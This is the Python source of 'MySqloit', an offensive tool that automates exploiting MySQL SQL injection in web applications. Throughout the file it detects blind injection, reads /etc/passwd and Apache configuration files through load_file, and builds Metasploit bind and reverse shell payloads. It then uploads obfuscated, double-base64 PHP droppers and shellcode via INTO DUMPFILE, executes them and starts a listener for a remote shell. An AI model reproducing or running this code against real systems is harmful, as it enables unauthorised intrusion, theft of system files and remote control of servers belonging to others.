#!/usr/bin/env python

# MySqloit v0.2
# Usage: ./mysqloit.py

import conf
import urllib2
import socket
import base64
import getopt
import sys
import os
import time
import urllib
from urllib2 import Request, urlopen, URLError, HTTPError
import socket
import random

injection_value = None

def hit_url(url):
    try:
	urllib2.urlopen(url)
    except URLError, e:
	if "timed out" in e.reason:
	    print "=> Request to URL [%s] timed out (this is normal)" % url
	    # Ignore socket timeouts; sometimes when we hit a URl it
	    # doesn't return anything
	    pass
	else:
	    raise

def make_request(parameter):
    """
    Construct a urllib2 request object and get the response, based on an
    exploit parameter.  Handles POST and GET request.
    """
    global conf
    data = None
    if conf.request == 'GET' and conf.datatype == 'string':
        url = conf.url + '354d3adb33f657' + "'" + parameter ###add single quote
        #elite_string1 = "BENCHMARK(10000000,SHA1(1))" + "'"
    elif conf.request == 'GET' and conf.datatype == 'integer':
	url = conf.url + '3546574545' + parameter 
    elif conf.request == 'POST' and conf.datatype == 'string':
        url = conf.url   #post with string
        data = conf.post_injection
        data = data + "d3adb33f" + "'"
        data += parameter + conf.post_last_injection
    else:
	url = conf.url   #post with integer
        data = conf.post_injection
        data = data + "3451345341"
        data += parameter + conf.post_last_injection
    req = urllib2.Request(url=url)
    #req = urllib2.Request(url,data)
    req.add_header('User-Agent', conf.agent)
    response = urllib2.urlopen(req, data)
    #response = urllib2.urlopen(req)
    return response


def test(url):
    socket.setdefaulttimeout(20)
    global injection_value
    url = conf.url
    elite_string = "BENCHMARK(10000000,SHA1(1))"
    string_quote = ",null" + "'"
    into = "+into+outfile+"
    union_select = "+UNION+select+"
    for i in range(30):
        null = ",null"      
        k= i * null
        if conf.datatype == 'string':
          parameter = union_select + elite_string + k + string_quote   #string requires a single quote for the last null
        else:
          parameter = union_select + elite_string + k
        try:	
          response = make_request(parameter)
	except HTTPError, e:
          print 'The server couldn\'t fulfill the request.'
          print 'Error code: ', e.code
	except URLError, e:
          print 'Testing on the deep blind injection'
          if 'timed out' in e.reason:
              print 'Injection successfull with', parameter
              injection_value = parameter
              print 'Injection is successfull'
              return 'found'
	      exit(0)
    print 'Injection  not successfull'
    exit(0)

def fingerprint():
    socket.setdefaulttimeout(15)
    url = conf.url+'"'
    inject_error="\'"
    response = make_request(inject_error)
    html = response.read(300)
    print 'Trying discover the working directory through SQL error message'
    if html.count('valid MySQL result') or ('error in your SQL syntax') or ('Incorrect column'):
        print 'Error successfully generated'
        print html
        exit(0)    
    else: 
        print 'Cant print the working directory through error message'
	print 'Trying to discover by loading the conf file'
        global injection_value	
        if fingerprint_inital() == 'linux':
            elite_string = 'load_file("/etc/apache2/sites-available/default")'
            read_conf_file = injection_value.replace("BENCHMARK(10000000,SHA1(1))",elite_string) # need to add more
            print 'Reading the apache2 configuration file'
            response = make_request(read_conf_file)
            html = response.read(300)
            if html.count('DocumentRoot'):
                print 'conf file successfully discovered'
	        print 'Printing the conf file'
	        print html
	        exit(0)
        else: 
	    elite_string = 'load_file("C:/Program%20Files/Apache%20Group/Apache2/conf/httpd.conf")' #need to add more
	    read_conf_file = injection_value.replace("BENCHMARK(10000000,SHA1(1))",elite_string)
            print 'Reading the apache2 configuration file'
            response = make_request(read_conf_file)
            html = response.read(3100)
            if html.count('DocumentRoot'):
                print 'conf file successfully discovered'
	        print 'Printing the conf file'
	        print html
            else:
		print 'Failed to fingerprint conf file'
	     
def fingerprint_inital():
    global injection_value
    url = conf.url
    socket.setdefaulttimeout(15)
    if test(url) == 'found':
        elite_string = 'load_file("/etc/passwd")' 
	fingerprint_value = injection_value.replace("BENCHMARK(10000000,SHA1(1))",elite_string)  ##no more time based attack
        print 'Fingerprinting the operating system'
        response = make_request(fingerprint_value)   
        html = response.read(300)
        if html.count('root'):  
            return 'linux'
        else:
            return 'windows'
    else:
	exit(0)
	
def fingerprint_os():
    #configuration()
    url = conf.url
    #if test(url) == 'found':   #do not need this
    if fingerprint_inital() == 'linux':
        print 'DBS running on Linux!!!'
    else:
        print 'DBS running on Windows!!!' 
    
def payloads():
    argc = len(sys.argv)
    if argc < 4:
        if sys.argv[2] == 'help':
            if fingerprint_inital() == 'linux': 
                print 'Linux shellcode'
                print 'arguments => [bind/reverse/findsock] [port no]' 
            else:
                print 'Windows shellcode'
	        print 'arguments => [bind/reverse] [port no]'
    else:
        if sys.argv[2] == 'bind':
            if fingerprint_inital() == 'windows':  
                print 'OS running on Windows'
                print 'Baking a bind vnc shellcode for Windows on port', sys.argv[3] 
                msfpayload = conf.metasploit+"/msfpayload"+" "+"windows/vncinject/bind_tcp"+" "+"LPORT="+sys.argv[3]+" "+"X" 
                file = open("/tmp/mete.exe","wb")
                pipe = os.popen(msfpayload)
                for line in pipe.readlines():
                    file.write(line)
                    pipe.close()
            else:
	        print 'OS running on Linux' 
	        print 'Baking a bind shellcode for Linux on port', sys.argv[3]
	        msfpayload = conf.metasploit+"/msfpayload"+" "+"linux/x86/shell/bind_tcp"+" "+"LPORT="+sys.argv[3]+" "+"X"                  
                file = open("/tmp/mete.exe","wb")
                pipe = os.popen(msfpayload)
                for line in pipe.readlines():
                    file.write(line)
                    pipe.close()
		    
        elif sys.argv[2] == 'reverse':
            if fingerprint_inital() == 'windows':
                print 'OS running on Windows'
                print 'Baking a reverse vnc shellcode for Windows'     
                msfpayload = conf.metasploit+"/msfpayload"+" "+"windows/vncinject/reverse_tcp"+" "+"LHOST="+conf.ip+" "+"LPORT="+sys.argv[3]+" "+"X" 
                file=open("/tmp/mete.exe","wb")
                pipe = os.popen(msfpayload)
                for line in pipe.readlines():
                    file.write(line)
                    pipe.close()
            else:
                print 'OS running on Linux'
	        print 'Baking a reverse shellcode for Linux on port', sys.argv[3]
	        msfpayload = conf.metasploit+"/msfpayload"+" "+"linux/x86/shell/reverse_tcp"+" "+"LHOST="+conf.ip+" "+"LPORT="+sys.argv[3]+" "+"X" 
                file = open("/tmp/mete.exe","wb")
                pipe = os.popen(msfpayload)
                for line in pipe.readlines():
                    file.write(line)
                    pipe.close()
		    
        elif sys.argv[2] == 'findsock':
            if fingerprint_inital() == 'windows':
                print 'Findsock shell for windows is not supported' 
	    else:      
                msfpayload = conf.metasploit+"/msfpayload"+" "+"php/shell_findsock"+" "+" "+"R"+" "+"|"+" "+conf.metasploit+"/msfencode"+" "+"-e"+" "+"php/base64"+" "+"-t"+" "+"raw"
                file = open("/tmp/shellcode","w")
                pipe = os.popen(msfpayload)
                for line in pipe.readlines():
                    file.write(line)
                    file.close()
                    pipe.close()

def exploit():
    argc = len(sys.argv)
    if argc < 4:
        if sys.argv[2] == 'help':
            print 'arguments => [bind/reverse/findsock] [port no] [working dir] [uploaded shellcode dir]'
    else:
        url = conf.url
        global random_file
        if test(url) == 'found':
             
	    if fingerprint_inital() == 'windows':
		random_file = random.random()
		first_var_exe = "<?php%20$filename%20=%20'compress2"+str(random_file)+".exe';"   #compresss shellcode on the web server
	        second_var_exe = "$myFile%20=%20'metedecom"+str(random_file)+".exe';"            ##metedecom.exe
	        reverse_shell=conf.metasploit+"/msfcli"+" "+"exploit/multi/handler"+" "+"PAYLOAD=windows/vncinject/reverse_tcp"+" "+"LHOST="+conf.ip+" "+"LPORT="+sys.argv[3]+" "+"E"
                bind_shell=conf.metasploit+"/msfcli"+" "+"exploit/multi/handler"+" "+"PAYLOAD=windows/vncinject/bind_tcp"+" "+"RHOST="+conf.ip+" "+"LPORT="+sys.argv[3]+" "+"E"
		chmod = first_var_exe+second_var_exe+"exec($myFile);"
		
	    elif fingerprint_inital() == 'linux':
		
		random_file = random.random()
  		reverse_shell=conf.metasploit+"/msfcli"+" "+"exploit/multi/handler"+" "+"PAYLOAD=linux/x86/shell/reverse_tcp"+" "+"LHOST="+conf.ip+" "+"LPORT="+sys.argv[3]+" "+"E"
                bind_shell=conf.metasploit+"/msfcli"+" "+"exploit/multi/handler"+" "+"PAYLOAD=linux/x86/shell/bind_tcp"+" "+"RHOST="+conf.ip+" "+"LPORT="+sys.argv[3]+" "+"E"
                first_var_exe = "<?php%20$final_output%20=%20'mysqploit"+str(random_file)+".exe';"   #this is owned by mysql user
	        second_var_exe = "$file_input%20=%20'metedecom"+str(random_file)+".exe';"
		chmod = first_var_exe+second_var_exe+"$s='YzJWMFgyMWhaMmxqWDNGMWIzUmxjMTl5ZFc1MGFXMWxJQ2d3S1RzS0pHaGtJRDBnWm" + \
	        "05d1pXNG9KR1pwYkdWZmFXNXdkWFFzSUNkeVlpY3BPd29rYlhsemRISnBibWR2ZFhROUlHWnlaV0ZrS0NSb1pDd2dNVEF3TURBd0" + \
	        "tUc0tabU5zYjNObEtDUm9aQ2s3Q2lSd2RISWdQU0JtYjNCbGJpZ2tabWx1WVd4ZmIzVjBjSFYwTENBbmQySW5LVHNLWm5keWFYUm" + \
	        "xLQ1J3ZEhJc0lDUnRlWE4wY21sdVoyOTFkQ2s3Q21aamJHOXpaU2drY0hSeUtUc0tKR1pwYm1Gc0lEMGdJbU5vYlc5a0lEYzNOeU" + \
	        "FrWm1sdVlXeGZiM1YwY0hWMElqc0tjSEpwYm5RZ0pHWnBibUZzT3dwemVYTjBaVzBvSWlSbWFXNWhiQ0lwT3dwemVYTjBaVzBvSW" + \
	        "k0dkpHWnBibUZzWDI5MWRIQjFkQ0lwT3c9PQ==';eval(base64_decode(base64_decode($s)));"
		
	global injection_value
	access_file="php"+" "+"/tmp/compress.php"
        delete_file="rm"+" "+"-"+"rf"+" "+"/tmp/compress.php"
        delete_exe="rm"+" "+"-"+"rf"+" "+"/tmp/compress2.exe"
        delete_trim1="rm"+" "+"-"+"rf"+" "+"/tmp/trim1.txt"
        delete_trim2="rm"+" "+"-"+"rf"+" "+"/tmp/trim2.txt"
	delete_mete="rm"+" "+"-"+"rf"+" "+"/tmp/mete.exe"
        trim="xxd"+" "+"-p"+" "+"/tmp/compress2.exe"+">"+"/tmp/trim1.txt"
	delete_exe="rm"+" "+"-"+"rf"+" "+"/tmp/mete.exe"
        trim2="cat"+" "+"/tmp/trim1.txt"+" "+"|"+" "+"tr"+" "+"-d"+" "+"\\"+"\\n"+">"+"/tmp/trim2.txt"
        gzip = "<?php $s='SkdacGJHVnVZVzFsSUQwZ0lpOTBiWEF2YldWMFpTNWxlR1VpT3dva2FHRnVaR3hsSUQwZ1ptOXda" + \
        "VzRvSkdacGJHVnVZVzFsTENBaQpjbUlpS1RzS0pHTnZiblJsYm5SeklEMGdabkpsWVdRb0pHaGhi" + \
        "bVJzWlN3Z1ptbHNaWE5wZW1Vb0pHWnBiR1Z1WVcxbEtTazdDbVZqCmFHOGdjMmw2Wlc5bUtDUmpi" + \
        "MjUwWlc1MGN5azdDaVJqYjIxd2NtVnpjMlZrSUQwZ1ozcGpiMjF3Y21WemN5Z2tZMjl1ZEdWdWRI" + \
        "TXAKT3dwbVkyeHZjMlVvSkdoaGJtUnNaU2s3Q2lSdGVVWnBiR1VnUFNBaUwzUnRjQzlqYjIxd2Nt" + \
        "Vnpjekl1WlhobElqc0tKR1pvSUQwZwpabTl3Wlc0b0pHMTVSbWxzWlN3Z0ozZGlKeWtnYjNJZ1pH" + \
        "bGxLQ0pqWVc0bmRDQnZjR1Z1SUdacGJHVWlLVHNLWm5keWFYUmxLQ1JtCmFDd2dKR052YlhCeVpY" + \
        "TnpaV1FwT3dwbVkyeHZjMlVvSkdab0tUcz0=';eval(base64_decode(base64_decode($s)));" 
        file = open("/tmp/compress.php", "w")
        file.write(gzip)
        file.close()
        os.system(access_file)
        os.system(trim)
        os.system(trim2)
	os.system(delete_mete)
        site = conf.site 
        into = '+into+dumpfile+'
        union_select = '+UNION+select+'	
 
        FILE = '/tmp/trim2.txt'
        f = open(FILE, 'r')
        string = f.read()
        string_encode = urllib.quote_plus(string)
        #for i in range(50):
	#k = i * ',0x00'                                                    ##need to use this on thr last part of injection string
	elite_string='0x'+string_encode
        if conf.datatype == 'string':
           end = ""
        else:
           end = "'"
	upload = into+"'"+urllib.quote(sys.argv[4])+sys.argv[5]+'/compress2'+str(random_file)+'.exe' + end
        #upload= into+"'"+(sys.argv[4])+sys.argv[5]+'/compress2'+str(random_file)+'.exe' + end
        exploit_injection =  injection_value.replace("BENCHMARK(10000000,SHA1(1))",elite_string)
	noop = ",0x00"                             #either 0x00 or 0x90
	#half_injection = exploit_injection.replace(",null'",noop)
        #if conf.datatype == 'string':
        null_quote = ",0x00'"
        #else:
        null = ",null"
        half_injection = exploit_injection.replace(null,noop)
        half_injection = half_injection.replace(null_quote,noop)   #useful for POST as POST uses quote for the last null
  	full_injection = half_injection + upload
	print 'Uploading compressed shellcode ==>', full_injection
	response = make_request(full_injection)
	os.system(delete_file)
        os.system(delete_exe)
        os.system(delete_trim1)
        os.system(delete_trim2)
	os.system(delete_exe)
        if conf.datatype == 'string':
           end = ""
        else:
           end = "'"
	first_var = "<?php%20$filename%20=%20'compress2"+str(random_file)+".exe';"   #compresss shellcode on the web server
	second_var = "$myFile%20=%20'metedecom"+str(random_file)+".exe';"            ##metedecom.exe
	dgzip = first_var+second_var+"$s='SkdoaGJtUnNaU0E5SUdadmNHVnVLQ1JtYVd4bGJtRnRaU3dnSW5KaUlpazdDaVJqY" + \
	"jI1MFpXNTBjeUE5SUdaeVpXRmtLQ1JvWVc1a2JHVXNJR1pwYkdWemFYcGxLQ1JtYVd4bGJtRnRaU2twT3dva2RXNWpiMjF3Y21W" + \
	"emMyVmtJRDBnWjNwMWJtTnZiWEJ5WlhOektDUmpiMjUwWlc1MGN5azdDbkJ5YVc1MElIVnVZMjl0Y0hKbGMzTmxaRHNLSTJaamJ" + \
	"HOXpaU2drYUdGdVpHeGxLVHNLQ2lSbWFDQTlJR1p2Y0dWdUtDUnRlVVpwYkdVc0lDZDNZaWNwSUc5eUlHUnBaU2dpWTJGdUozUW" + \
	"diM0JsYmlCbWFXeGxJaWs3Q21aM2NtbDBaU2drWm1nc0lDUjFibU52YlhCeVpYTnpaV1FwT3dwbVkyeHZjMlVvSkdab0tUc0s='" + \
	";eval(base64_decode(base64_decode($s)));"
	elite_string='"'+dgzip+'"'
	upload= into+"'"+urllib.quote(sys.argv[4])+sys.argv[5]+'/decompress'+str(random_file)+'.php'+ end #changes on new version
        exploit_injection =  injection_value.replace("BENCHMARK(10000000,SHA1(1))",elite_string)
	noop = ",0x00"
        null_quote = ",0x00'"
	half_injection = exploit_injection.replace(null,noop)
        half_injection = half_injection.replace(null_quote,noop)
	full_injection = half_injection + upload
	print 'Uploading decompression tool',full_injection
	response = make_request(full_injection)
	elite_string='"'+chmod+'"'
	upload= into+"'"+urllib.quote(sys.argv[4])+sys.argv[5]+'/metedecom'+str(random_file)+'.php'+ end  #changes on new version
        exploit_injection =  injection_value.replace("BENCHMARK(10000000,SHA1(1))",elite_string)
	noop = ",0x00"
        null_quote = ",0x00'"
	half_injection = exploit_injection.replace(null,noop)
        half_injection = half_injection.replace(null_quote,noop)
	full_injection = half_injection + upload
	print 'Uploading chmod tool',full_injection
	response = make_request(full_injection)
	time.sleep(10)                     
	shell_url = site+"/"+sys.argv[5]+'/decompress'+str(random_file)+'.php'
	print 'Decompressing shellcode'
	socket.setdefaulttimeout(15)
	print shell_url
        hit_url(shell_url)
	shell_url = site+"/"+sys.argv[5]+'/metedecom'+str(random_file)+'.php'
        if sys.argv[2] == 'reverse':
            pid = os.fork() 
            if pid == 0: 
                print '=> Executing shellcode'
    	        time.sleep(20) 
                hit_url(shell_url)
	        exit(0)
            else:
                print '=> Starting metasploit listener on port', sys.argv[3]
                os.system(reverse_shell)        ##just removed on the latest version
        elif sys.argv[2] == 'bind':
            pid = os.fork() 
            if pid == 0: 
	        print '=> Connecting to port', sys.argv[3]
	        hit_url(shell_url)
		exit(0)
                                
            else:
                print '=> Executing shellcode'
	        os.system(bind_shell)
	        time.sleep(10)
		exit(0)
  
        else:
            print 'Wrong arguments' 
			
                
def main(argv):
    try:  
        opt, args = getopt.getopt(argv, "htofp:e:", ["help", "test", "os", "fingerprint", "payload=", "exploit="])
         
    except getopt.GetoptError, err: 
        print str(err)
        usage()
        sys.exit(2)   
    for o, a in opt:
        if o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-t", "--test"):
            test(a)
        elif o in ("-o", "--os"):
            fingerprint_os()
        elif o in ("-f", "--fingerprint"):
            fingerprint()
        elif o in ("-p", "--payload"):
            payloads() 
        elif o in ("-e", "--exploit"):
            exploit()  
        else:
            assert False, "unhandled option"

def usage():
    usage = """
                     \||/
                 |  @___oo
       /\  /\   / (__,,,,|      
      ) /^\) ^\/ _)
      )   /^\/   _)            
      )   _ /  / _)        MySqloit          
  /\  )/\/ ||  | )_)
 <  >      |(,,) )__)
  ||      /    \)___)\         
  | \____(      )___) )___      
   \______(_______;;; __;;;
   
   
   
    -h --help                  Help
    -t --test                  Test the SQL Injection
    -o --os                    Fingerprint the operating system
    -f --fingerprint           Fingerprint the working directory
    -e --exploit               Exploit. Enter 'help' as argument for more options 
    -p --payload               Create payload. Enter 'help' as argument for more options    

    """
    print usage

if __name__ == "__main__":
    main(sys.argv[1:]) 
